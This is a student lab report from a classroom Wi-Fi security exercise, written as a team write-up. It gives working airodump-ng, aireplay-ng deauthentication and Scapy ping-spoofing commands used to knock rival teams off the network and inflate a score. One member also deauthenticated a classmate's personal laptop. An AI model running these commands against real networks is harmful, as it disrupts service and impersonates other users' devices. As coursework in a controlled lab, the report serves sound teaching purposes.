<div class="titlePage">

# Lab 1 Report

##### Team 3: Hannah Callihan, Jerrel Gordon, Grant Butler, Rusheel Raj
</div>

<div class="center">

#### Table of Contents
</div>
[TOC]
<div class="pageBreak"></div>

#### Task 1: Finding Wi-Fi Routers and Clients
<sub>Display available WiFi Access Points and Stations in the classroom. Explain what method/tool you used for this purpose.</sub>

Using command:
```bash
sudo tcpdump -i wlan1mon 'icmp'
```
We were able to view all the available wifi access points and filtering the results to only show the `icmp` packets being sent, since the script on the PIs specifically stated `ping 192.168.1.120` and `ping` uses icmp.

@import "assets/airodump_of_all_pis.png"
<sub>*all APs with ESSIDs that start with `FITSec`*
</sub>


#### Task 2: Sniffing Wi-Fi Traffic
<sub>Sniff the Wi-Fi interface and provide some screenshots of packets transmitted.</sub>

Used the command:
```bash
sudo airodump-ng wlan1mon –c 9
```
to sniff the Wi-Fi transmissions and see packets being sent.

@import "assets/network_sniff.png"
<sub>*packets sniffed with `airodump-ng`*
</sub>

<div class="pageBreak"></div>

#### Task 3: Sending De-Authentication Packets
<sub>How did you send the de-authentication packets? How did you confirm it worked?</sub>

Found the BSSIDs of a specific PI with command:
```bash
sudo airodump-ng wlan1mon --bssid={client BSSID} -c 9
```
@import "assets/getting_bssids.png"
<sub>*the bssid of a station connected to the router with essid of `FITSec-Team-1`*
</sub>

Then, used the BSSID to send a de-authentication attack to the router pretending to be the PI.

The command used:
```bash
sudo aireplay-ng wlan1mon -0 1000 -a {router BSSID} -c {client BSSID}
```

@import "assets/sending_deauth_attack.png"
<sub>*sending a de-auth attack by pretending to be the station requesting de-auth to the router*
</sub>

Confirmed that the attack worked by seeing that Team 1's score was no longer going up each time the scoreboard updated.

<sub>*A deauthing chaos then ensued and ultimately broke the network, which, as I would later learn was Nick de-authing the FITSec-Air router.*
、ヽ｀、ヽ｀个o( ಡ_ಡ)｀ヽ、｀ヽ、
</sub>

<div class="pageBreak"></div>

#### Task 4: Spoofing Pings to Artificially Inflate Scores
<sub>What procedure (if any) did you follow to beat the game? Has it worked? If not, what went wrong? Explain in short.</sub>

First recorded a pcap with command:
```bash
sudo tcpdump -i wlan1mon 'icmp' -w lab1.pcap
```

Then, opened the pcap in wireshark to get the key in plaintext from the packet (Note that this was only easy because the key was not encrypted).
@import "assets/key_from_pcap.png"
<sub>*pcap from traffic using `tcpdump` of icmp traffic and using it to get the key to spoof packet*
</sub>

Finally, we used Scapy to spoof the ping packets with:
```py
packet=IP(src="192.168.1.92",dst="192.168.1.120")/ICMP()/Raw(load="key{9b3e1a6eb20bkey{9b3e")
send(packet,loop=1)
```

@import "assets/spoof_four.png"
<sub>*spoofing with four instances of scapy running on the pi*
</sub>

<div class="pageBreak"></div>

#### Project Contributions
<sub>Who did what in the project/report?</sub>

##### Hannah

Found available Wi-Fi Access Points and Stations in the classroom. Sniffed Wi-Fi interface. Worked on sending the deauthentication attacks to Teams 1 and 2. Wrote majority of lab report.

##### Jerrel
Used Wireshark to find team keys to assist in spoofing attacks. Used `tcpdump` to capture network information and used Scapy to spoof team score. Set this up on multiple devices.

##### Grant
Found available Wi-Fi APs, including the routers and clients with ESSIDs starting with `FITSec` using `airodump-ng`. Sniffed Wi-Fi packets being sent using `tcpdump` along with the specific BSSID being targeted. Used Wireshark with the help of Rusheel to find the key to spoof the pings. Sent the frames using `scapy` to inflate our score. Sent de-authentication attacks on Teams 1 and 4 using `aireplay-ng`, including one of Team 4’s personal laptops. Helped with Lab Report.

##### Rusheel Raj
Used wireshark to find team keys to assist in spoofing attacks. Used `tcpdump` to capture network information and used scapy to spoof other teams.
